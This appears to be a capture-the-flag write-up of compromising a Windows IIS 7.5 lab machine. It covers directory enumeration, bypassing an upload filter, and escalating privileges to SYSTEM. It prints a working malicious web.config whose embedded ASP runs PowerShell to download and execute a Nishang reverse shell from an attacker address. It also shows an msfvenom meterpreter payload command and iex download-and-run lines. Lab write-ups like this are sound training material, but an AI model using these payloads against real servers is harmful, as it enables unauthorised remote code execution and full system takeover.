1,Recon
port scan
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
Page check
![](images/Pasted%20image%2020241216020337.png)
The index page seems like nothing here.

So we would continue to enumerate the web-content.
```
root@kali# gobuster -u http://10.10.10.93 -w usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -o gobuster_root -x aspx

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.93/
[+] Threads      : 30
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Output file  : gobuster_root
[+] Status codes : 301,302,307,200,204
[+] Extensions   : .aspx
=====================================================
/transfer.aspx (Status: 200)
/uploadedFiles (Status: 301)
/uploadedfiles (Status: 301)
=====================================================

```
In this place, there is uploading page here.
![](images/Pasted%20image%2020241216021347.png)
In this place, only image files could be upload, and 
The response headers indicate that the site is powered by ASP.NET:
```
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Thu, 31 May 2018 03:46:26 GMT
Accept-Ranges: bytes
ETag: "20ba8ef391f8d31:0"
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Mon, 18 Jun 2018 13:39:22 GMT
Connection: close
Content-Length: 630
```

I can bypass the filter by adding a null byte after our aspx so that the app thinks it’s a jpg, but then saves it as an aspx:
![](images/Pasted%20image%2020241216023451.png)
Then I upload it successfully, but it seems not work here.
when I then view http://10.10.10.93/UploadedFiles/cmdasp.aspx, it returns an error:
![](images/Pasted%20image%2020241216023531.png)
It leads me to the web.config
https://soroush.me/blog/tag/unrestricted-file-upload/
This blog has given us a way to use web.config with shell code.

I would like use `Nishang’s Invoke-PowerShellTcp.ps1` to handle a reverse shell.

So basically I need a WSCRIPT.SHELL COM object, and use it’s Run function to run a command. Ok, so because I only want to run one specific line to download and execute my Nishang shell, this should be simple. Here’s a web.config file that will start that process:
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.16.8/Invoke-PowerShellTcp.ps1')")
%>
```

Now, I take two steps:

1, Upload the web.config using the web form
2, Visit http://10.10.10.93/UploadedFiles/web.config, which runs the asp code, which invokes PowerShell to download the Nishang shell, and then run it creating a connection back to me

2, Privesc: merlin –> SYSTEM
It turns out that the file is there, it’s just hidden. If I re-run Get-ChildItem (or gci or ls) with the -Force flag, it shows up:
```
PS C:\users\merlin\desktop> gci -force


    Directory: C:\users\merlin\desktop


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a-hs         5/30/2018  12:22 AM        282 desktop.ini
-a-h-         5/30/2018  11:32 PM         32 user.txt

```

By checking the systeminfo
```
PS C:\Users\merlin\Desktop> systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          12/16/2024, 3:19:53 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2645 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,247 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,193 MB
Virtual Memory: In Use:    902 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.93
```

`Microsoft Windows Server 2008 R2 Datacenter` is a very old version, so of course we can use kernel vulners.

Metasploit has a very nice, built in, exploit suggester. I’ll need a meterpreter shell. First, generate some PowerShell as a loader:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.8 LPORT=445 -f psh -o met-445.ps1

From the target machine run
iex(new-object net.webclient).downloadstring('http://10.10.16.8/met-445.ps1')

Invoke-WebRequest "http://10.10.16.8/met-445.ps1" -OutFile "shell.ps1"

```

Then when we get the meterpreter shell, we can use `multi/recon/local_exploit_suggester` to check kernel exploits
```
1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                                                                                                                                                    
 7   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!                                                                                                                                                               
 9   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 12  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.

```

In this place, I use `exploit/windows/local/ms16_075_reflection_juicy` and then successfully get the shell as SYSTEM.
